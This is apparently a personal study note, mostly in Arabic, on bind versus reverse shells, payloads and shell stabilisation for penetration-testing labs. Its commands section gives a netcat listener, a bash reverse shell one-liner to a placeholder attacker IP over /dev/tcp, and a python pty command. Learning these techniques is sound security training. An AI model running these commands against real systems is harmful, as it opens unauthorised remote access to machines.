# Shells & Payloads

> Status: 🟨 In progress

## Overview
الفرق بين bind shell و reverse shell، وبناء payloads مناسبة لكل لغة/بيئة متاحة على الهدف (bash, python, php, powershell...).

## Key Concepts
- reverse shell أفضل غالبًا بسبب NAT/Firewall على جهة الهدف
- تثبيت الـ shell (stabilizing) بعد الحصول عليه (pty, stty)

## Important Commands / Tools
```bash
nc -lvnp 4444                                   # listener
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1     # reverse shell bash
python3 -c 'import pty;pty.spawn("/bin/bash")'  # stabilize
```

## Lab Notes / Walkthrough
- عملت قائمة مرجعية بصيغ الـ reverse shell لكل لغة لاستخدامها بسرعة وقت الحاجة

## Common Mistakes / Gotchas
- فتح listener على port محجوب بالـ firewall الصادر من جهتي

## Related Cheatsheet
- [../../cheatsheet/](../../cheatsheet/)
